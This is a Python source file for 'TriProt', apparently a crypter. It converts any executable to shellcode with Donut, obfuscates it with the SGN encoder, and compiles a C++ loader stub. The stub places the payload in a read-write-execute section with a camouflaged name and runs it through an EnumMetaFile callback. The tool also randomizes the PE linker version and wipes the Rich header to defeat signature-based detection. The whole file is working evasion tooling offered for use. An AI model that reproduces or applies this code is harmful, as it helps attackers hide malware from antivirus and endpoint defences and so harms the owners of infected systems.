# --- START OF FILE TriProt.py ---
import subprocess
import os
import sys
import argparse
import tempfile
import time
import threading
import random
import string
import shutil
import math
from colorama import init, Fore, Style
import secrets
import struct # Needed for checksum calculation
try:
    import pefile
except ImportError:
    print(f"{Fore.RED}[-]{Style.RESET_ALL} Error: 'pefile' library not found.")
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Please install it using: pip install pefile")
    sys.exit(1)
init(autoreset=True)
UD = "./Utils/"
DDP = os.path.join(UD, "E2S.X")
DSP = os.path.join(UD, "SGN.X")
DCP = "cl.exe"
DA = "-z 4"
SAT = '-i "{ib}" -o "{ob}"'
COMPILER_FLAGS = [
    '/nologo', '/O1', '/GL', '/Gy', '/GS-', '/MT', '/EHsc', '/W3',
    '/D', 'WIN32', '/D', 'NDEBUG', '/DEBUG:NONE'
]
LINKER_FLAGS = [
    '/LTCG', '/OPT:REF', '/OPT:ICF', '/INCREMENTAL:NO', '/SUBSYSTEM:WINDOWS'
]
LIBRARIES = [
    'kernel32.lib', 'user32.lib', 'gdi32.lib'
]
LEGIT_SECTION_NAMES = [
    ".reloc",
    ".rsrc", ".bss", ".tls",
    ".textbss", ".INIT"
]
def pi(m): print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {m}")
def ps(m): print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {m}")
def pw(m): print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {m}")
def pe(m): print(f"{Fore.RED}[-]{Style.RESET_ALL} {m}")
sse = threading.Event()
st = None
def sf():
    cs = ['|','/','-','\\']; i = 0
    while not sse.is_set():
        try: sys.stdout.write(f"\r{Fore.YELLOW}{Style.BRIGHT}{cs[i % 4]}{Style.RESET_ALL} Processing..."); sys.stdout.flush()
        except ValueError: break
        i += 1; time.sleep(0.1)
    if i > 0:
        try: sys.stdout.write('\r' + ' ' * (len(" Processing...") + 2) + '\r'); sys.stdout.flush()
        except ValueError: pass
def ss():
    global st;
    if st and st.is_alive(): return
    sse.clear(); st = threading.Thread(target=sf, daemon=True); st.start()
def stsp():
    global st
    if st and st.is_alive(): sse.set(); st.join(timeout=0.5)
    try: sys.stdout.write('\r' + ' ' * (len(" Processing...") + 2) + '\r'); sys.stdout.flush()
    except ValueError: pass
    st = None
def rcmd(cmd):
    stsp()
    use_shell = isinstance(cmd, str)
    creation_flags = 0
    if sys.platform == "win32":
        creation_flags = subprocess.CREATE_NO_WINDOW
    try:
        process = subprocess.Popen(
            cmd,
            shell=use_shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=creation_flags
        )
        stdout_bytes, stderr_bytes = process.communicate()
        stdout = stdout_bytes.decode(sys.stdout.encoding or 'utf-8', errors='replace') if stdout_bytes else ''
        stderr = stderr_bytes.decode(sys.stderr.encoding or 'utf-8', errors='replace') if stderr_bytes else ''
        if process.returncode != 0:
            stsp()
            pe(f"External command failed (Code: {process.returncode}): "
               f"{os.path.basename(cmd if isinstance(cmd, str) else cmd[0])}")
            if stdout:
                pe("--- Stdout Output ---")
                print(stdout.strip(), file=sys.stderr)
                pe("--- End Stdout ---")
            if stderr:
                pe("--- Stderr Output ---")
                print(stderr.strip(), file=sys.stderr)
                pe("--- End Stderr ---")
            raise subprocess.CalledProcessError(
                process.returncode, cmd, output=stdout, stderr=stderr
            )
    except FileNotFoundError as e:
        stsp()
        pe(f"Required tool not found: "
           f"{os.path.basename(cmd if isinstance(cmd, str) else cmd[0])}")
        pe(f"Error details: {e}")
        raise
    except Exception as e:
        stsp()
        pe(f"An unexpected error occurred running command: {cmd}")
        pe(f"Error details: {e}")
        raise
    finally:
        stsp()
def rtp(target, default, name):
    abs_target = os.path.abspath(target) if target else None
    abs_default = os.path.abspath(default)
    if abs_target and os.path.isfile(abs_target): return abs_target
    if os.path.isfile(abs_default): return abs_default
    search_name = os.path.basename(target if target else default)
    found_path = shutil.which(search_name)
    if found_path: return os.path.abspath(found_path)
    final_target = target if target else default
    pw(f"{name} ('{final_target}') resolution failed; relying on shell PATH.")
    return final_target
def check_libs(libs_to_check):
    lib_paths = os.environ.get('LIB', '').split(os.pathsep)
    if not lib_paths:
        pw("LIB environment variable not found or empty. Cannot check library existence.")
        return False
    all_found = True
    pi("Checking for required libraries in LIB paths:")
    for lib in libs_to_check:
        found = False
        for path in lib_paths:
            if os.path.isfile(os.path.join(path, lib)):
                ps(f"  [+] Found: {lib}")
                found = True
                break
        if not found:
            pe(f"  [-] Missing: {lib}")
            all_found = False
    if not all_found:
        pe("One or more required libraries were not found in LIB paths.")
        pw(f"Current LIB paths: {';'.join(lib_paths)}")
        pw("Ensure you are running in a correctly configured Developer Command Prompt.")
    return all_found
def cce():
    compiler_path = shutil.which("cl.exe")
    if not compiler_path:
         pe("Build environment error: 'cl.exe' not found in PATH.")
         pw("Ensure script runs within a configured Developer Command Prompt.")
         return False
    missing = [v for v in ("INCLUDE", "LIB", "LIBPATH") if not os.environ.get(v)]
    if missing:
        pw(f"Build environment warning: Missing {', '.join(missing)} variables.")
    return True
def format_size(size_bytes):
    if size_bytes == 0: return "0 B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    num_bytes = abs(size_bytes)
    try:
        if num_bytes < 1:
            return f"{size_bytes} B"
        i = int(math.floor(math.log(num_bytes, 1024)))
        i = max(0, min(i, len(size_name) - 1))
        p = math.pow(1024, i)
        s = round(size_bytes / p, 2)
        return f"{s} {size_name[i]}"
    except (ValueError, OverflowError):
        return f"{size_bytes} B"
def calculate_xor_checksum(payload_data):
    checksum = 0
    # Process in 4-byte chunks using struct for unpacking
    for i in range(0, len(payload_data) - 3, 4):
        chunk, = struct.unpack_from('<I', payload_data, i) # '<I' is little-endian unsigned int
        checksum ^= chunk
    # Handle remaining bytes
    remaining_bytes = len(payload_data) % 4
    if remaining_bytes > 0:
        last_chunk_data = payload_data[len(payload_data) - remaining_bytes:]
        # Pad with zeros to make 4 bytes for consistent unpacking
        last_chunk_data += b'\x00' * (4 - remaining_bytes)
        last_chunk, = struct.unpack('<I', last_chunk_data)
        checksum ^= last_chunk
    # Ensure it fits in 32 bits (though XOR naturally does this)
    return checksum & 0xFFFFFFFF
def patch_pe_header(filepath):
    pi("Stage 5: Patching PE Header...")
    try:
        pe_obj = pefile.PE(filepath, fast_load=False)
        old_major = pe_obj.OPTIONAL_HEADER.MajorLinkerVersion
        old_minor = pe_obj.OPTIONAL_HEADER.MinorLinkerVersion
        new_major = secrets.randbelow(256)
        new_minor = secrets.randbelow(256)
        pe_obj.OPTIONAL_HEADER.MajorLinkerVersion = new_major
        pe_obj.OPTIONAL_HEADER.MinorLinkerVersion = new_minor
        ps(f"   - Linker version randomized: {old_major}.{old_minor} -> {new_major}.{new_minor}")
        rich_header_offset = -1
        rich_header_len = 0
        pe_offset = pe_obj.DOS_HEADER.e_lfanew
        if hasattr(pe_obj, 'RICH_HEADER') and pe_obj.RICH_HEADER:
            search_start = 0x40
            header_data = pe_obj.get_data(0, pe_offset)
            rich_marker = b'Rich'
            found_offset = header_data.find(rich_marker, search_start)
            if found_offset != -1:
                rich_header_offset = found_offset
                rich_header_len = pe_offset - rich_header_offset
                pi(f"   - Rich Header identified: Offset={hex(rich_header_offset)}, Length={rich_header_len} bytes")
            else:
                 pw("   - Rich Header marker 'Rich' not found in expected area. Cannot overwrite.")
        else:
            pi("   - No Rich Header detected by pefile.")
        temp_patched_path = filepath + ".tmp_patch"
        pi(f"   - Writing PE changes (linker version) to temporary file: {temp_patched_path}")
        pe_obj.write(filename=temp_patched_path)
        pe_obj.close()
        if rich_header_offset != -1 and rich_header_len > 0:
            pi(f"   - Overwriting Rich Header section in {temp_patched_path}...")
            try:
                with open(temp_patched_path, "r+b") as f:
                    f.seek(rich_header_offset)
                    f.write(b'\x00' * rich_header_len)
                ps(f"   - Rich Header section overwritten with {rich_header_len} null bytes.")
            except IOError as e:
                stsp()
                pe(f"   - Error overwriting Rich Header section: {e}")
                pass
        try:
            shutil.move(temp_patched_path, filepath)
            ps(f"   - Patched PE file saved successfully: {filepath}")
        except OSError as e:
            stsp()
            pe(f"   - Failed to replace original file with patched version: {e}")
            pe(f"   - Patched file might be left as: {temp_patched_path}")
            return False
        stsp()
        ps("PE Header patching complete.")
        return True
    except pefile.PEFormatError as e:
        stsp()
        pe(f"   - Failed to parse PE file '{filepath}': {e}")
        return False
    except IOError as e:
        stsp()
        pe(f"   - File I/O error during patching '{filepath}': {e}")
        if os.path.exists(temp_patched_path):
             try: os.remove(temp_patched_path)
             except OSError: pass
        return False
    except Exception as e:
        stsp()
        pe(f"   - An unexpected error occurred during PE patching: {e}")
        if os.path.exists(temp_patched_path):
             try: os.remove(temp_patched_path)
             except OSError: pass
        import traceback
        traceback.print_exc()
        return False
    finally:
        stsp()
def main():
    p = argparse.ArgumentParser(
        description="TRIPROT Protector. Embeds payload, uses EnumMetaFile callback, patches PE headers, adds payload hash validation.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog="Requires 'pefile' library: pip install pefile"
    )
    p.add_argument("-i","--input",    required=True, help="Input executable (.exe) to protect.")
    p.add_argument("-o","--output",   required=True, help="Output path for the protected executable (.exe).")
    p.add_argument("--donut",         default=DDP,   help="Path to Donut executable (E2S.X).")
    p.add_argument("--sgn",           default=DSP,   help="Path to SGN executable (SGN.X).")
    p.add_argument("--compiler",      default=DCP,   help="Path to C++ compiler (cl.exe).")
    p.add_argument("--keep-temp",     action="store_true", help="Keep temporary files and directory after execution.")
    p.add_argument("--skip-patching", action="store_true", help="Skip the PE header patching stage.")
    args = p.parse_args()
    stsp()
    print("-" * 60)
    pi(f"{Fore.WHITE}{Style.BRIGHT}TRIPROT Protector (LineDDA v5 + Hash Validation) Initializing...{Style.RESET_ALL}")
    print("-" * 60)
    if not cce(): sys.exit(1)
    if not check_libs(LIBRARIES): sys.exit(1)
    original_size = 0
    td = None
    oea = None
    try:
        iea = os.path.abspath(args.input)
        oea = os.path.abspath(args.output)
        if not os.path.isfile(iea): pe(f"Input file '{args.input}' not found."); sys.exit(1)
        original_size = os.path.getsize(iea)
        odir = os.path.dirname(oea);
        if odir: os.makedirs(odir, exist_ok=True)
        compiler = rtp(args.compiler, DCP, "Compiler (cl.exe)")
        donut    = rtp(args.donut,    DDP,   "Donut")
        sgn      = rtp(args.sgn,      DSP,   "SGN")
        if not shutil.which(compiler): pe(f"Resolved compiler '{compiler}' not found or not executable."); sys.exit(1)
        td = tempfile.mkdtemp(prefix="TriProtDDA_")
        bpath = os.path.join(td, "payload.bin")
        encpath = os.path.join(td, "payload.enc")
        stubcpp = os.path.join(td, "stub.cpp")
        pi("Stage 1: Transforming input PE to position-independent shellcode...")
        ss(); cmd = f'"{donut}" -i "{iea}" -o "{bpath}" {DA}'; rcmd(cmd); stsp()
        if not os.path.exists(bpath) or os.path.getsize(bpath) == 0: pe("Shellcode file missing/empty after Donut."); sys.exit(1)
        pi("Stage 2: Applying SGN encoding/obfuscation layer...")
        ss(); cmd = f'"{sgn}" {SAT.format(ib=bpath, ob=encpath)}'; rcmd(cmd); stsp()
        if not os.path.exists(encpath) or os.path.getsize(encpath) == 0: pe("Encoded payload missing/empty after SGN."); sys.exit(1)
        pi("Stage 3: Constructing executable loader stub (EnumMetaFile Callback)...")
        exec_sec_name = secrets.choice(LEGIT_SECTION_NAMES)
        pi(f"   - Defining executable section: {Fore.MAGENTA}{exec_sec_name}{Style.RESET_ALL}")
        hex_vals = ""; payload_size_str = "0 B"; payload_len = 0; payload_checksum = 0
        data = b"" # Initialize data as empty bytes
        try:
            pi("   - Reading encoded payload..."); ss()
            with open(encpath, "rb") as f: data = f.read()
            stsp(); payload_size_str = format_size(len(data))
            if not data:
                pw("   - Warning: Encoded payload data is empty.")
                sys.exit(1) # Cannot proceed without payload data
            payload_checksum = calculate_xor_checksum(data)
            pi(f"   - Calculated payload checksum: {hex(payload_checksum)}")
            pad_len = int(len(data) * 0.5)
            dummy_pattern = [0x90] * pad_len
            mixed_payload = list(data) + dummy_pattern
            payload_len = len(mixed_payload)
            hex_vals = ", ".join(f"0x{b:02x}" for b in mixed_payload)
        except OSError as e: stsp(); pe(f"   - Failed to read encoded payload '{encpath}': {e}"); sys.exit(1)
        pi(f"   - Embedding {Style.BRIGHT}{payload_size_str}{Style.RESET_ALL} of encoded payload (+ padding -> {format_size(payload_len)}) into ERW section...")
        pi(f"   - Setting execution trigger: {Fore.YELLOW}EnumMetaFile Callback{Style.RESET_ALL}")
        if payload_len == 0:
             pw("   - Warning: Calculated payload length is zero. Stub might fail.")
             payload_len = 1
        stub_code = f"""#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstring> // For memcpy
#pragma comment(linker, "/SECTION:{exec_sec_name},ERW")
#pragma section("{exec_sec_name}", read, execute)
__declspec(allocate("{exec_sec_name}")) const unsigned char g_payload[{payload_len}] = {{ {hex_vals} }};
const size_t g_payload_real_size = {len(data)};
const unsigned int g_expected_checksum = {payload_checksum}U; // Embed the pre-calculated hash
typedef int (CALLBACK* MFENUMPROC)(HDC hdc, HANDLETABLE *lpht, METARECORD *lpMR, int nObj, LPARAM param);
// Simple 32-bit XOR checksum calculation function (matches Python version)
unsigned int calculate_runtime_checksum(const unsigned char* data, size_t size) {{
    unsigned int checksum = 0;
    size_t i = 0;
    // Process data in 4-byte chunks (unsigned int)
    while (i + 3 < size) {{
        unsigned int chunk;
        // Use memcpy to safely read potentially unaligned data as little-endian uint
        memcpy(&chunk, data + i, sizeof(unsigned int));
        checksum ^= chunk;
        i += 4;
    }}
    // Handle remaining bytes (0 to 3 bytes)
    if (i < size) {{
        unsigned int last_chunk = 0;
        // Copy remaining bytes into the low bytes of last_chunk
        memcpy(&last_chunk, data + i, size - i);
        checksum ^= last_chunk;
    }}
    return checksum;
}}
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {{
    if (sizeof(g_payload) < 1 || g_payload_real_size == 0) return 1; // Basic allocation check
    // --- HASH VALIDATION ---
    unsigned int runtime_checksum = calculate_runtime_checksum(g_payload, g_payload_real_size);
    if (runtime_checksum != g_expected_checksum) {{
        // Checksum mismatch! Payload might be tampered. Exit silently.
        // Use a distinct exit code if desired for debugging, but 0 or 1 is common.
        return 5; // Exit code indicating validation failure
    }}
    // --- END HASH VALIDATION ---
    HDC metafileDC = CreateMetaFile(NULL);
    if (!metafileDC) {{
        return 2;
    }}
    MoveToEx(metafileDC, 1, 1, NULL);
    HMETAFILE hmf = CloseMetaFile(metafileDC);
    if (!hmf) {{
        return 3;
    }}
    auto cb = reinterpret_cast<MFENUMPROC>(
                  const_cast<unsigned char*>(g_payload)
              );
    HDC refHDC = GetDC(NULL);
    if (refHDC) {{
        EnumMetaFile(refHDC, hmf, cb, 0);
        ReleaseDC(NULL, refHDC);
    }} else {{
        DeleteMetaFile(hmf);
        return 4;
    }}
    DeleteMetaFile(hmf);
    return 0;
}}"""
        try:
            pi("   - Writing C++ stub file..."); ss()
            with open(stubcpp, "w", encoding="utf-8") as f: f.write(stub_code)
            stsp(); ps("   - Stub file written successfully.")
        except OSError as e: stsp(); pe(f"   - Failed to write C++ stub file '{stubcpp}': {e}"); sys.exit(1)
        pi(f"Stage 4: Compiling stub with LTCG (using EnumMetaFile trigger)...")
        ss()
        try:
            compile_cmd_list = [ compiler ]
            compile_cmd_list.extend(COMPILER_FLAGS)
            compile_cmd_list.append(stubcpp)
            compile_cmd_list.append(f'/Fe:{oea}')
            compile_cmd_list.append('/link')
            compile_cmd_list.extend(LINKER_FLAGS)
            compile_cmd_list.extend(LIBRARIES)
            rcmd(compile_cmd_list)
        except Exception as e:
            pe(f"Generated C++ stub (may be deleted): {stubcpp}")
            sys.exit(1)
        finally: stsp()
        if not os.path.exists(oea) or os.path.getsize(oea) == 0:
             pe("Compilation resulted in missing/empty output executable."); sys.exit(1)
        else:
            ps("Stub compilation successful.")
        final_size = 0
        if not args.skip_patching:
            if not patch_pe_header(oea):
                pe("PE Header patching failed. Output file might be unstable or unpatched.")
                pw("Continuing with potentially unpatched/partially patched output file.")
        else:
            pi("Skipping PE header patching as requested.")
        if os.path.exists(oea):
            final_size = os.path.getsize(oea)
        else:
            pe("Output file seems missing after patching step!")
            final_size = 0
        stsp()
        print("-" * 60); ps(f"{Fore.GREEN}{Style.BRIGHT}Protection Applied Successfully! (Using EMF Trigger v5 + Hash Check){Style.RESET_ALL}")
        print(f" {Fore.CYAN}{Style.BRIGHT}Input File:{Style.RESET_ALL}  {iea}"); print(f" {Fore.CYAN}{Style.BRIGHT}Output File:{Style.RESET_ALL} {oea}")
        patch_status = "Skipped" if args.skip_patching else "Applied (Randomized Linker Ver, Nullified Rich Header)"
        print(f" {Fore.CYAN}{Style.BRIGHT}PE Patching:{Style.RESET_ALL} {patch_status}")
        print(f" {Fore.CYAN}{Style.BRIGHT}Payload Hash:{Style.RESET_ALL} {hex(payload_checksum)} (Validated at runtime)")
        print("-" * 60); print(f" {Fore.YELLOW}Original Size:{Style.RESET_ALL} {format_size(original_size)}"); print(f" {Fore.YELLOW}Final Size:   {Style.RESET_ALL} {format_size(final_size)}")
        if final_size > 0 and original_size > 0:
             size_diff = final_size - original_size; diff_sign = "+" if size_diff >= 0 else "-"
             print(f" {Fore.YELLOW}Size Change:{Style.RESET_ALL}  {diff_sign}{format_size(abs(size_diff))}");
        print("-" * 60)
        pw("Note: Payload execution relies on EnumMetaFile callback & hash validation."); pw("Effectiveness depends on shellcode robustness & single-call assumption."); print("-" * 60)
    except Exception as e:
        stsp(); pe(f"An critical error occurred during processing: {e}"); import traceback; traceback.print_exc(); sys.exit(1)
    finally:
        stsp();
        if td and os.path.isdir(td):
            if not args.keep_temp:
                pi(f"Cleaning up temporary directory: {td}")
                try: shutil.rmtree(td); ps("Cleanup successful.")
                except OSError as e: pw(f"Cleanup warning: Could not remove temp directory {td}: {e}")
            else: pi(f"Temporary build artifacts retained at: {td}")
        if oea:
            temp_patch_file = oea + ".tmp_patch"
            if os.path.exists(temp_patch_file):
                pw(f"Cleaning up leftover temporary patch file: {temp_patch_file}")
                try: os.remove(temp_patch_file)
                except OSError as e: pw(f"Could not remove leftover temp file {temp_patch_file}: {e}")
if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: stsp(); pw("\nOperation cancelled by user."); sys.exit(1)
    except SystemExit as e: stsp(); sys.exit(e.code)
    except Exception as e: stsp(); pe(f"Unhandled exception caught at top level: {e}"); import traceback; traceback.print_exc(); sys.exit(99)
    finally: stsp()
# --- END OF FILE TriProt.py ---